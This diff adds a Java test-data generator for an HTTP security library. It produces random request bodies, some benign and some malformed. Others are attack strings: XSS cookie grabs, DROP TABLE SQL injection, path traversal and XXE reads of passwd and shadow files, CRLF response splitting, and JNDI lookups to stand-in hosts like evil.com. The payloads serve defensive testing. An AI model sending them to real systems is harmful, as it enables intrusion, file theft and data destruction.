@@ -1,0 +1,607 @@
+/*
+ * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package de.cuioss.http.security.generators.body;
+
+import de.cuioss.test.generator.Generators;
+import de.cuioss.test.generator.TypedGenerator;
+import de.cuioss.http.security.data.HTTPBody;
+
+/**
+ * Generates HTTPBody records for testing purposes.
+ *
+ * <p>QI-6: Converted from fixedValues() to dynamic algorithmic generation.</p>
+ *
+ * IMPROVED: Uses dynamic generation instead of hardcoded arrays for better randomness
+ * and unpredictability while maintaining attack effectiveness.
+ *
+ * Implements: Task G9 from HTTP verification specification
+ */
+public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
+
+    // Core generation parameters - QI-6: Converted from fixedValues() to dynamic generation
+    private final TypedGenerator<Integer> contentTypeGenerator = Generators.integers(0, 3);
+    private final TypedGenerator<Integer> userNameSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> roleSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> scriptTypeSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> xssCategorySelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> sqlTypeSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> tableCategorySelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> systemPathTypeSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> domainCategorySelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> dataSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> encodingSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> depthGen = Generators.integers(1, 5);
+    private final TypedGenerator<Integer> payloadSize = Generators.integers(100, 500);
+    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
+    private final TypedGenerator<Integer> stringSize = Generators.integers(3, 12);
+    private final TypedGenerator<Integer> numberRange = Generators.integers(100, 999);
+
+    @Override
+    public HTTPBody next() {
+        int type = contentTypeGenerator.next();
+
+        String content = switch (type) {
+            case 0 -> generateSafeContent();
+            case 1 -> generateAttackContent();
+            case 2 -> generateMalformedContent();
+            default -> generateSafeContent();
+        };
+
+        String contentType = generateContentType();
+        String encoding = generateEncoding();
+
+        return new HTTPBody(content, contentType, encoding);
+    }
+
+    private String generateSafeContent() {
+        int contentType = Generators.integers(0, 6).next();
+        return switch (contentType) {
+            case 0 -> generateJsonContent();
+            case 1 -> generateFormData();
+            case 2 -> generateXmlContent();
+            case 3 -> generatePlainText();
+            case 4 -> generateFileContent();
+            case 5 -> generateTokenContent();
+            case 6 -> generateStatusContent();
+            default -> generatePlainText();
+        };
+    }
+
+    private String generateJsonContent() {
+        String user = generateUserName();
+        String role = generateRole();
+        return "{\"user\":\"" + user + "\",\"role\":\"" + role + "\"}";
+    }
+
+    private String generateFormData() {
+        String user = generateUserName();
+        String pass = "secret" + numberRange.next();
+        return "username=" + user + "&password=" + pass;
+    }
+
+    private String generateXmlContent() {
+        String user = generateUserName();
+        String role = generateRole();
+        return "<user><name>" + user + "</name><role>" + role + "</role></user>";
+    }
+
+    private String generatePlainText() {
+        String[] templates = {
+                "Hello World",
+                "file content here",
+                "search query: java programming",
+                "comment: This is a test comment",
+                "description: Product information",
+                "message: Welcome to our application"
+        };
+        return templates[Generators.integers(0, templates.length - 1).next()];
+    }
+
+    private String generateFileContent() {
+        String dataType = generateDataType();
+        int id = Generators.integers(1000, 9999).next();
+        return "data: " + id + ", type: " + dataType;
+    }
+
+    private String generateTokenContent() {
+        String prefix = generateTokenPrefix();
+        String value = Generators.letterStrings(8, 16).next().toLowerCase();
+        return prefix + ": " + value;
+    }
+
+    private String generateStatusContent() {
+        String status = generateStatus();
+        String version = Generators.integers(1, 5).next() + "." + Generators.integers(0, 9).next();
+        return "status: " + status + ", version: " + version;
+    }
+
+    private String generateAttackContent() {
+        int attackType = Generators.integers(0, 8).next();
+        return switch (attackType) {
+            case 0 -> generateXSSAttack();
+            case 1 -> generateSQLInjection();
+            case 2 -> generatePathTraversal();
+            case 3 -> generateJNDIAttack();
+            case 4 -> generateControlCharAttack();
+            case 5 -> generateResponseSplitting();
+            case 6 -> generateXXEAttack();
+            case 7 -> generateUnicodeAttack();
+            case 8 -> generateLargePayload();
+            default -> generateXSSAttack();
+        };
+    }
+
+    private String generateXSSAttack() {
+        String scriptName = generateScriptName();
+        String payload = generateXSSPayload();
+        return "<script>" + scriptName + "('" + payload + "')</script>";
+    }
+
+    private String generateSQLInjection() {
+        String command = generateSQLCommand();
+        String table = generateTableName();
+        return "'; " + command + " " + table + "; --";
+    }
+
+    private String generatePathTraversal() {
+        int depth = depthGen.next();
+        StringBuilder path = new StringBuilder();
+        for (int i = 0; i < depth; i++) {
+            path.append("../");
+        }
+        path.append(generateSystemFile());
+        return path.toString();
+    }
+
+    private String generateJNDIAttack() {
+        String host = generateMaliciousDomain();
+        String exploit = generateExploitTerm();
+        return "${jndi:ldap://" + host + "/" + exploit + "}";
+    }
+
+    private String generateControlCharAttack() {
+        int numChars = Generators.integers(3, 6).next();
+        StringBuilder chars = new StringBuilder();
+        for (int i = 0; i < numChars; i++) {
+            int charCode = Generators.integers(0, 31).next();
+            chars.append("\\u").append("%04x".formatted(charCode));
+        }
+        return chars.toString();
+    }
+
+    private String generateResponseSplitting() {
+        String status = generateHTTPStatus();
+        return "%0d%0a%0d%0aHTTP/1.1 " + status + "%0d%0a";
+    }
+
+    private String generateXXEAttack() {
+        String systemFile = generateSystemFile();
+        String entityName = generateEntityName();
+        return "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY " + entityName + " SYSTEM \"file:///" + systemFile + "\">]><foo>&" + entityName + ";</foo>";
+    }
+
+    private String generateUnicodeAttack() {
+        String scriptName = generateScriptName();
+        return "\\u202e\\u202d" + scriptName + ":alert(1)";
+    }
+
+    private String generateLargePayload() {
+        int size = payloadSize.next();
+        return Generators.letterStrings(size, size + 100).next();
+    }
+
+    private String generateMalformedContent() {
+        int malformType = Generators.integers(0, 7).next();
+        return switch (malformType) {
+            case 0 -> ""; // Empty content
+            case 1 -> "   "; // Whitespace only
+            case 2 -> generateBinaryData();
+            case 3 -> generateMalformedJson();
+            case 4 -> generateMalformedXml();
+            case 5 -> generateEmptyFormData();
+            case 6 -> generateHeaderInjection();
+            case 7 -> generateZeroWidthChars();
+            default -> "";
+        };
+    }
+
+    private String generateBinaryData() {
+        int numBytes = Generators.integers(3, 8).next();
+        StringBuilder binary = new StringBuilder();
+        for (int i = 0; i < numBytes; i++) {
+            int byteVal = Generators.integers(0, 255).next();
+            binary.append("\\u").append("%04x".formatted(byteVal));
+        }
+        return binary.toString();
+    }
+
+    private String generateMalformedJson() {
+        String key = generateDataType();
+        String value = generateJSONValue();
+        return "{\"" + key + "\": " + value + ",}"; // Extra comma
+    }
+
+    private String generateMalformedXml() {
+        String tagName = generateDataType();
+        return "<" + tagName + "><tag>"; // Unclosed tags
+    }
+
+    private String generateEmptyFormData() {
+        String[] fields = {"username", "password", "email", "submit"};
+        StringBuilder form = new StringBuilder();
+        for (int i = 0; i < fields.length; i++) {
+            if (i > 0) form.append("&");
+            form.append(fields[i]).append("=");
+        }
+        return form.toString();
+    }
+
+    private String generateHeaderInjection() {
+        String header = generateHeaderName();
+        return header + ": text/html\\r\\n\\r\\n<html>";
+    }
+
+    private String generateZeroWidthChars() {
+        String[] zeroWidth = {"\\u200B", "\\u200C", "\\u200D", "\\u2060"};
+        StringBuilder chars = new StringBuilder();
+        for (int i = 0; i < Generators.integers(2, 6).next(); i++) {
+            chars.append(zeroWidth[Generators.integers(0, zeroWidth.length - 1).next()]);
+        }
+        return chars.toString();
+    }
+
+    private String generateContentType() {
+        int contentTypeType = Generators.integers(0, 3).next();
+        return switch (contentTypeType) {
+            case 0 -> generateStandardContentType();
+            case 1 -> generateAttackContentType();
+            case 2 -> generateMalformedContentType();
+            default -> generateStandardContentType();
+        };
+    }
+
+    private String generateStandardContentType() {
+        String[] standard = {
+                "application/json", "application/x-www-form-urlencoded", "text/plain",
+                "text/html", "text/xml", "application/xml", "multipart/form-data",
+                "application/octet-stream", "image/png", "image/jpeg"
+        };
+        String base = standard[Generators.integers(0, standard.length - 1).next()];
+        if (contextSelector.next()) {
+            base += "; charset=utf-8";
+        }
+        return base;
+    }
+
+    private String generateAttackContentType() {
+        String attack = generateAttackTerm();
+        return "text/html; charset=<" + attack + ">alert(1)</" + attack + ">";
+    }
+
+    private String generateMalformedContentType() {
+        int malformType = Generators.integers(0, 4).next();
+        return switch (malformType) {
+            case 0 -> "";
+            case 1 -> "   ";
+            case 2 -> "../../../etc/passwd";
+            case 3 -> "application\\u0000/json";
+            case 4 -> "invalid/content/type/with/slashes";
+            default -> "";
+        };
+    }
+
+    private String generateEncoding() {
+        int encodingType = Generators.integers(0, 3).next();
+        return switch (encodingType) {
+            case 0 -> ""; // No encoding
+            case 1 -> generateStandardEncoding();
+            case 2 -> generateAttackEncoding();
+            case 3 -> generateMalformedEncoding();
+            default -> "";
+        };
+    }
+
+    private String generateStandardEncoding() {
+        String encoding = generateEncodingType();
+        if (contextSelector.next()) {
+            String second = generateEncodingType();
+            return encoding + ", " + second;
+        }
+        return encoding;
+    }
+
+    private String generateAttackEncoding() {
+        String attack = generateAttackTerm();
+        return "gzip\\r\\nX-Injected: " + attack;
+    }
+
+    private String generateMalformedEncoding() {
+        int malformType = Generators.integers(0, 3).next();
+        return switch (malformType) {
+            case 0 -> "   ";
+            case 1 -> "../../../etc/passwd";
+            case 2 -> "gzip\\u0000deflate";
+            case 3 -> Generators.letterStrings(50, 200).next();
+            default -> "   ";
+        };
+    }
+
+    // QI-6: Dynamic generation helper methods
+    private String generateUserName() {
+        return switch (userNameSelector.next()) {
+            case 1 -> "john";
+            case 2 -> "admin";
+            case 3 -> "user";
+            case 4 -> "test";
+            default -> "john";
+        };
+    }
+
+    private String generateRole() {
+        return switch (roleSelector.next()) {
+            case 1 -> "admin";
+            case 2 -> "user";
+            case 3 -> "guest";
+            case 4 -> "manager";
+            default -> "admin";
+        };
+    }
+
+    private String generateDataType() {
+        return switch (dataSelector.next()) {
+            case 1 -> "user";
+            case 2 -> "product";
+            case 3 -> "order";
+            case 4 -> "session";
+            default -> "user";
+        };
+    }
+
+    private String generateTokenPrefix() {
+        String[] prefixes = {"token", "id", "key", "auth", "bearer", "access"};
+        return prefixes[Generators.integers(0, prefixes.length - 1).next()];
+    }
+
+    private String generateStatus() {
+        String[] statuses = {"active", "inactive", "pending", "completed", "running", "failed"};
+        return statuses[Generators.integers(0, statuses.length - 1).next()];
+    }
+
+    private String generateScriptName() {
+        int scriptType = Generators.integers(0, 2).next();
+        return switch (scriptType) {
+            case 0 -> generateScriptType();
+            case 1 -> generateAsyncScriptType();
+            case 2 -> "func" + Generators.integers(1, 99).next();
+            default -> generateScriptType();
+        };
+    }
+
+    private String generateScriptType() {
+        return switch (scriptTypeSelector.next()) {
+            case 1 -> "alert";
+            case 2 -> "confirm";
+            case 3 -> "prompt";
+            default -> "alert";
+        };
+    }
+
+    private String generateAsyncScriptType() {
+        return switch (Generators.integers(1, 3).next()) {
+            case 1 -> "eval";
+            case 2 -> "setTimeout";
+            case 3 -> "setInterval";
+            default -> "eval";
+        };
+    }
+
+    private String generateXSSPayload() {
+        int xssType = Generators.integers(0, 3).next();
+        return switch (xssType) {
+            case 0 -> generateXSSCategory();
+            case 1 -> "document." + generateDocumentProperty();
+            case 2 -> String.valueOf(Generators.integers(1, 9999).next());
+            case 3 -> "'" + Generators.letterStrings(3, 8).next() + "'";
+            default -> generateXSSCategory();
+        };
+    }
+
+    private String generateXSSCategory() {
+        return switch (xssCategorySelector.next()) {
+            case 1 -> "XSS";
+            case 2 -> "1";
+            case 3 -> "cookie";
+            default -> "XSS";
+        };
+    }
+
+    private String generateDocumentProperty() {
+        return switch (Generators.integers(1, 3).next()) {
+            case 1 -> "cookie";
+            case 2 -> "domain";
+            case 3 -> "location";
+            default -> "cookie";
+        };
+    }
+
+    private String generateSQLCommand() {
+        String type = generateSQLType();
+        return switch (type) {
+            case "DROP" -> "DROP TABLE";
+            case "DELETE" -> "DELETE FROM";
+            case "INSERT" -> "INSERT INTO";
+            default -> type + " " + generateSQLKeyword();
+        };
+    }
+
+    private String generateSQLType() {
+        return switch (sqlTypeSelector.next()) {
+            case 1 -> "DROP";
+            case 2 -> "DELETE";
+            case 3 -> "INSERT";
+            default -> "DROP";
+        };
+    }
+
+    private String generateSQLKeyword() {
+        return switch (Generators.integers(1, 3).next()) {
+            case 1 -> "FROM";
+            case 2 -> "INTO";
+            case 3 -> "TABLE";
+            default -> "FROM";
+        };
+    }
+
+    private String generateTableName() {
+        int tableType = Generators.integers(0, 2).next();
+        return switch (tableType) {
+            case 0 -> generateTableCategory();
+            case 1 -> "tbl_" + Generators.letterStrings(4, 8).next().toLowerCase();
+            case 2 -> generateSystemTableName();
+            default -> generateTableCategory();
+        };
+    }
+
+    private String generateTableCategory() {
+        return switch (tableCategorySelector.next()) {
+            case 1 -> "users";
+            case 2 -> "admin";
+            case 3 -> "accounts";
+            case 4 -> "sessions";
+            default -> "users";
+        };
+    }
+
+    private String generateSystemTableName() {
+        return switch (Generators.integers(1, 4).next()) {
+            case 1 -> "data";
+            case 2 -> "config";
+            case 3 -> "logs";
+            case 4 -> "temp";
+            default -> "data";
+        };
+    }
+
+    private String generateSystemFile() {
+        String pathType = generateSystemPathType();
+        return switch (pathType) {
+            case "etc" -> "etc/" + generateEtcFile();
+            case "windows" -> "windows/" + generateWindowsFile();
+            case "boot" -> "boot.ini";
+            case "shadow" -> "etc/shadow";
+            default -> pathType + "/" + Generators.letterStrings(3, 8).next();
+        };
+    }
+
+    private String generateSystemPathType() {
+        return switch (systemPathTypeSelector.next()) {
+            case 1 -> "etc";
+            case 2 -> "windows";
+            case 3 -> "boot";
+            case 4 -> "shadow";
+            default -> "etc";
+        };
+    }
+
+    private String generateEtcFile() {
+        return switch (Generators.integers(1, 4).next()) {
+            case 1 -> "passwd";
+            case 2 -> "shadow";
+            case 3 -> "hosts";
+            case 4 -> "config";
+            default -> "passwd";
+        };
+    }
+
+    private String generateWindowsFile() {
+        return switch (Generators.integers(1, 3).next()) {
+            case 1 -> "win.ini";
+            case 2 -> "system.ini";
+            case 3 -> "boot.ini";
+            default -> "win.ini";
+        };
+    }
+
+    private String generateMaliciousDomain() {
+        String category = generateDomainCategory();
+        String tld = generateTopLevelDomain();
+        return category + "." + tld;
+    }
+
+    private String generateDomainCategory() {
+        return switch (domainCategorySelector.next()) {
+            case 1 -> "evil";
+            case 2 -> "attacker";
+            case 3 -> "malicious";
+            default -> "evil";
+        };
+    }
+
+    private String generateTopLevelDomain() {
+        return switch (Generators.integers(1, 4).next()) {
+            case 1 -> "com";
+            case 2 -> "net";
+            case 3 -> "org";
+            case 4 -> "xyz";
+            default -> "com";
+        };
+    }
+
+    private String generateExploitTerm() {
+        String[] terms = {"exploit", "payload", "attack", "shell", "cmd", "exec"};
+        return terms[Generators.integers(0, terms.length - 1).next()];
+    }
+
+    private String generateHTTPStatus() {
+        String[] statuses = {"200 OK", "404 Not Found", "500 Error", "403 Forbidden", "401 Unauthorized"};
+        return statuses[Generators.integers(0, statuses.length - 1).next()];
+    }
+
+    private String generateEntityName() {
+        String[] entities = {"xxe", "exploit", "file", "entity", "dtd", "external"};
+        return entities[Generators.integers(0, entities.length - 1).next()];
+    }
+
+    private String generateJSONValue() {
+        String[] values = {"json", "data", "value", "content", "payload", "info"};
+        return values[Generators.integers(0, values.length - 1).next()];
+    }
+
+    private String generateHeaderName() {
+        String[] headers = {"Content-Type", "X-Forwarded-For", "User-Agent", "Authorization", "X-Custom", "Accept"};
+        return headers[Generators.integers(0, headers.length - 1).next()];
+    }
+
+    private String generateAttackTerm() {
+        String[] terms = {"script", "header", "passwd", "admin", "root", "cmd"};
+        return terms[Generators.integers(0, terms.length - 1).next()];
+    }
+
+    private String generateEncodingType() {
+        return switch (encodingSelector.next()) {
+            case 1 -> "gzip";
+            case 2 -> "deflate";
+            case 3 -> "br";
+            case 4 -> "compress";
+            default -> "gzip";
+        };
+    }
+
+    @Override
+    public Class<HTTPBody> getType() {
+        return HTTPBody.class;
+    }
+}
